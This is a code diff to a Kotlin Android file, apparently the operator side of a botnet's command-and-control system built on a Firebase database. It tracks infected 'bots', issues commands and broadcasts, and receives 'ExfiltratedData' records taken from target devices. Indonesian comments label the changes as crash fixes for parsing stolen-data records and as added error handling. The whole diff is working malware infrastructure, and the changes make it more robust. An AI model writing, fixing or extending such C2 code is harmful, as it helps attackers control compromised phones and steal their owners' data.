@@ -37,13 +37,22 @@ data class C2Command(
     val status: String = "pending"
 )
 
+// 🔥 FIX: Data class diubah — timestamp pake Any biar bisa nampung String dan Long
 data class ExfiltratedData(
     val dataId: String = "",
     val type: String = "",
     val content: String = "",
-    val timestamp: Long = System.currentTimeMillis(),
+    val timestamp: Any = System.currentTimeMillis(),
     val deviceId: String = ""
-)
+) {
+    fun getTimestampAsLong(): Long {
+        return when (timestamp) {
+            is Long -> timestamp as Long
+            is String -> (timestamp as String).toLongOrNull() ?: 0L
+            else -> 0L
+        }
+    }
+}
 
 object C2Manager {
     private const val TAG = "C2Manager"
@@ -81,8 +90,6 @@ object C2Manager {
         if (::database.isInitialized) return
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
-            // 🔥 FIX: HAPUS setPersistenceEnabled dari CONTROLLER
-            // Biar target aja yang pake, ga conflict
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
             exfilRef = database.getReference(REF_EXFIL)
@@ -117,13 +124,16 @@ object C2Manager {
                 _onBotUpdate?.invoke(snapshot.key ?: "", bot)
                 listenBotStatus(snapshot.key ?: "")
             }
+
             override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                 val bot = snapshot.getValue(BotInfo::class.java) ?: return
                 _onBotUpdate?.invoke(snapshot.key ?: "", bot)
             }
+
             override fun onChildRemoved(snapshot: DataSnapshot) {
                 _onBotDisconnected?.invoke(snapshot.key ?: "")
             }
+
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
             override fun onCancelled(error: DatabaseError) {}
         })
@@ -136,6 +146,7 @@ object C2Manager {
                 val bot = snapshot.getValue(BotInfo::class.java) ?: return
                 _onBotUpdate?.invoke(deviceId, bot)
             }
+
             override fun onCancelled(error: DatabaseError) {}
         }
         botsRef.child(deviceId).addValueEventListener(listener)
@@ -150,20 +161,37 @@ object C2Manager {
                     _onCommandReceived?.invoke(cmd)
                 }
             }
+
             override fun onCancelled(error: DatabaseError) {}
         }
         commandsRef.addValueEventListener(commandListener!!)
     }
 
+    // 🔥 FIX: listenForExfil pake Map manual biar gak crash
     private fun listenForExfil() {
         exfilListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 for (dataSnapshot in snapshot.children) {
-                    val data = dataSnapshot.getValue(ExfiltratedData::class.java) ?: continue
-                    _onExfilReceived?.invoke(data)
+                    try {
+                        // 🔥 FIX: Ambil sebagai Map dulu biar aman dari type mismatch
+                        val map = dataSnapshot.value as? Map<String, Any> ?: continue
+                        val data = ExfiltratedData(
+                            dataId = dataSnapshot.key ?: "",
+                            type = map["type"] as? String ?: "",
+                            content = map["content"] as? String ?: "",
+                            timestamp = map["timestamp"] ?: 0L,
+                            deviceId = map["deviceId"] as? String ?: ""
+                        )
+                        _onExfilReceived?.invoke(data)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error parsing exfil data: ${e.message}")
+                    }
                 }
             }
-            override fun onCancelled(error: DatabaseError) {}
+
+            override fun onCancelled(error: DatabaseError) {
+                _onConnectionError?.invoke("Exfil listener cancelled: ${error.message}")
+            }
         }
         exfilRef.addValueEventListener(exfilListener!!)
     }
@@ -194,9 +222,7 @@ object C2Manager {
         broadcastRef.child(cmdId).setValue(cmd)
     }
 
-    fun clearExfiltratedData() {
-        exfilRef.removeValue()
-    }
+    fun clearExfiltratedData() { exfilRef.removeValue() }
 
     fun removeBot(deviceId: String) {
         botsRef.child(deviceId).removeValue()
@@ -208,9 +234,7 @@ object C2Manager {
         botsRef.get().addOnSuccessListener { snapshot ->
             val bots = mutableMapOf<String, BotInfo>()
             for (child in snapshot.children) {
-                child.getValue(BotInfo::class.java)?.let {
-                    bots[child.key ?: ""] = it
-                }
+                child.getValue(BotInfo::class.java)?.let { bots[child.key ?: ""] = it }
             }
             callback(bots)
         }
@@ -220,7 +244,19 @@ object C2Manager {
         exfilRef.get().addOnSuccessListener { snapshot ->
             val data = mutableListOf<ExfiltratedData>()
             for (child in snapshot.children) {
-                child.getValue(ExfiltratedData::class.java)?.let { data.add(it) }
+                try {
+                    val map = child.value as? Map<String, Any> ?: continue
+                    val item = ExfiltratedData(
+                        dataId = child.key ?: "",
+                        type = map["type"] as? String ?: "",
+                        content = map["content"] as? String ?: "",
+                        timestamp = map["timestamp"] ?: 0L,
+                        deviceId = map["deviceId"] as? String ?: ""
+                    )
+                    data.add(item)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error parsing exfil: ${e.message}")
+                }
             }
             callback(data)
         }
